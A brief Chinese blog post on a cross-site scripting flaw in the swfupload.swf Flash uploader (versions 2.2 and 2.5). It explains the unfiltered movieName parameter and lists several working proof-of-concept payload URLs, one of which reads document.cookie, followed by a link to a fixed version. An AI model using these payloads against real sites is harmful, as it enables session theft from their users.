title: swfupload xss漏洞
date: '2016-12-14 12:22:02'
updated: '2016-12-14 12:24:20'
tags: [前端, js, flash, xss, web]
permalink: /articles/2016/12/14/1481689313203.html
---
<p>1、出问题的版本包括 V2.2\V2.5</p>
<p>2、查看漏洞效果</p>
<style type="text/css"><!--
p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 14.0px SimSun; -webkit-text-stroke: #000000}
span.s1 {font: 14.0px 'Songti SC'; font-kerning: none}
span.s2 {font-kerning: none}
--></style>
<p class="p1"><span class="s1"><strong>由于</strong></span><span class="s2">swfupload.swf</span><span class="s1"><strong>未对</strong></span><span class="s2">actionscript</span><span class="s1"><strong>函数</strong></span><span class="s2">ExternalInterface.call</span><span class="s1"><strong>传入的值进行判断和过滤，可以通过构造</strong></span><span class="s2">javascript</span><span class="s1"><strong>语句通过</strong></span><span class="s2">ExternalInterface.call</span><span class="s1"><strong>函数传递到</strong></span><span class="s2">flash</span><span class="s1"><strong>文件中，造成</strong></span><span class="s2">flash</span><span class="s1"><strong>跨站。</strong></span><span class="s2">Payload</span><span class="s1"><strong>如下：</strong></span></p>
<p class="p1"><span class="s2">swfupload.swf?movieName=aaa"])}catch(e){(alert)(1)};//</span></p>
<p class="p1"><span class="s2">swfupload.swf?movieName=aaa"])}catch(e){alert(1)};//</span></p>
<p class="p1"><span class="s2">swfupload.swf?movieName="])}catch(e){if(!window.x){window.x=1;(alert)(1)}}//</span></p>
<p class="p1"><span class="s2">swfupload.swf?movieName="])}catch(e){if(!window.x){window.x=1;alert(1)}}//</span></p>
<p>http://localhost:9000/javascripts/swfupload.swf?movieName=%22%5D)%7Dcatch(e)%7Bif(!window.x)%7Bwindow.x=1;alert(document.cookie)%7D%7D//</p>
<p>3、修复版本</p>
<p><a href="https://github.com/yoozi/swfupload-xss-security-fix" target="_blank">下载</a></p>
<p>4、flash xss漏洞及相关知识点</p>
<p>https://wizardforcel.gitbooks.io/xss-naxienian/content/14.html</p>